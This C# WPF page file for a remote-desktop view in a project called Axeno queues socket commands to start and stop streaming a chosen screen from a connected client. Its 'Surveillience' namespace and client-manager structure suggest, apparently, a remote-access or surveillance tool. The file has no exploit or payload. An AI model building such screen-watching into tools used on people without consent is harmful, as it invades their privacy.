using Axeno.Networking.Connection;
using Axeno.Networking.Functions.Surveillience;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Axeno.Views.Pages.ClientManager
{
    /// <summary>
    /// Interaction logic for RemoteDesktop.xaml
    /// </summary>
    public partial class RemoteDesktop : Page
    {
        public static Client Socket { get; set; }
        public RemoteDesktop(Client cli)
        {
            InitializeComponent();
            cli.Rdp = this;
            Socket = cli;
            Socket.QueueCommand(RemoteDesktopFunction.GetInfo());
        }
        /// <summary>
        /// start socket
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            if (cmbScreens.Items.Count == 0) return;
            if (btnstart.Content.ToString() == "Start")
            {
                int screen = Convert.ToInt32(cmbScreens.SelectedItem.ToString().Substring(7));
                Socket.QueueCommand(RemoteDesktopFunction.Start(0, screen));
                btnstart.Content = "Stop";

            }
            else
            {
                Socket.QueueCommand(RemoteDesktopFunction.Stop());
                btnstart.Content = "Start";

            }

        }
    }
}
